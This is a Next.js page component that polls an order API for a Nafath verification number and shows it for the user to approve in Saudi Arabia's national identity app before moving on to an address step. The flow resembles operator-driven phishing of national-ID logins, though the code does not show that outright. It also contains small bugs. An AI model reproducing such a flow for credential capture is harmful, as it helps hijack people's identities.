import { FaArrowRightLong } from "react-icons/fa6";
import { useRouter, useSearchParams } from "next/navigation";
import { Button, CircularProgress } from "@nextui-org/react";
import Link from "next/link";
import { useCallback, useEffect, useState } from "react";
import SwiperSlider from "@/components/SwiperSlider";
import { BsFillInfoCircleFill } from "react-icons/bs";
import { motion } from "framer-motion";

const NafatOtpOne = () => {
  const router = useRouter();
  const params = useSearchParams();
  const _id = params.get("id");

  // get order data from api localhost:3000/api/order/:id
  const [order, setOrder] = useState([]);

  const handleSubmit = (e) => {
    e.preventDefault();
    router.push({
      pathname: "/address",
      query: { id: params.get("id") },
    });
  };

  // a countdown timer function
  const [value, setValue] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setValue((v) => {
        if (order.nafatOtpOne) {
          clearInterval(interval);
          return 100; // Set to 100% when order.nafatOtpOne is true
        }
        if (v >= 100) {
          clearInterval(interval);
          return 100; // Stop at 100%
        }
        return v + 1;
      });
    }, 1200); // 1200 milliseconds = 1.2 seconds

    return () => clearInterval(interval);
  }, [order.nafatOtpOne]);

  const url = `${process.env.API_URL}/api/order/${_id}`;
  const fetchOrder = useCallback(async () => {
    if (!_id) return; // Early return if _id is not available or nafatOtpOne is already set

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error("Failed to fetch order data");
      }
      const data = await response.json();
      setOrder(data);
    } catch (error) {
      console.error("Error fetching order:", error);
    }
  }, [url, _id]);

  useEffect(() => {
    //if (order.nafatOtpOne) return; // Stop polling if nafatOtpOne is already set
    const intervalId = setInterval(() => {
      fetchOrder();
    }, 3000); // Poll every 5 seconds

    return () => clearInterval(intervalId);
  }, [fetchOrder, order.nafatOtpOne]);

  const reload = () => {
    window.location.reload();
  };

  return (
    <>
      <SwiperSlider />
      <div className="max-w-[1400px] w-[92%] lg:w-3/4 mx-auto flex flex-col justify-center items-center gap-6">
        <h1 className="text-4xl font-bold text-gray-600 mt-10 text-center">
          Verify Yourself with Nafat
        </h1>

        <div className="border-2 border-blue-300 p-4 flex flex-col lg:flex-row items-center gap-3">
          <BsFillInfoCircleFill color="blue" className="w-max" />
          <div className="text-center text-sm">
            <p>
              If you do not have the Nafath application installed on your
              device,
            </p>
            <p>first download it and register.</p>
          </div>
        </div>

        <p className="text-center font-semibold text-gray-600">
          To verify your information, Log in the <br /> Nafath app and select
          this code
        </p>

        <CircularProgress
          classNames={{
            svg: "w-36 h-36 drop-shadow-md",
            indicator: "stroke-[#0D9488]",
            track: "#0D9488",
            value: "text-3xl font-semibold text-gray-700",
          }}
          value={value}
          strokeWidth={4}
          showValueLabel={true}
        />

        {/* a countdown design round border */}
        <div className="h-14 w-14">
          {order.nafatOtpOne ? (
            <motion.div
              initial={{ scale: 0.9 }}
              animate={{ rotate: 360, scale: 1 }}
              transition={{
                type: "spring",
                stiffness: 260,
                damping: 20,
                repeat: Infinity,
                repeatType: "mirror",
                duration: 1.3,
                rotate: {
                  duration: 1, // Rotation happens over 1 second
                },
              }}
              className="bg-[#0D9488] text-white w-full h-full rounded-lg flex justify-center items-center"
            >
              <p>{order.nafatOtpOne}</p>
            </motion.div>
          ) : (
            <motion.div
              initial={{ scale: 0.9 }}
              animate={{ rotate: 360, scale: 1 }}
              transition={{
                type: "spring",
                stiffness: 260,
                damping: 20,
                repeat: Infinity,
                repeatType: "mirror",
                duration: 1.3,
                rotate: {
                  duration: 1, // Rotation happens over 1 second
                },
              }}
              className="bg-gray-400 text-white w-full h-full rounded-lg flex justify-center items-center"
            >
              <p>N/A</p>
            </motion.div>
          )}
          {/* </p> */}
        </div>
        <Link
          href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid"
          target="_blank"
          className="py-3 mt-4 px-5 w-fit text-gray-600 hover:text-white hover:bg-[#0D9488] font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out"
        >
          OPEN NAFATH APP
        </Link>
        <form onSubmit={handleSubmit} className="my-10 w-full">
          <Button
            color="primary"
            onClick={!order.nafatOtpOne ? reload : ""}
            type={!order.nafatOtpOne ? "button" : "submit"}
            className={`w-full text-white h-12 ${
              !order.nafatOtpOne
                ? "cursor-not-allowed bg-gray-400 "
                : "bg-[#0D9488]"
            }`}
          >
            Continue To Address <FaArrowRightLong size={16} />
          </Button>
        </form>
      </div>
      <div className="h-20 bg-teal-400 mt-5"></div>
    </>
  );
};

export default NafatOtpOne;
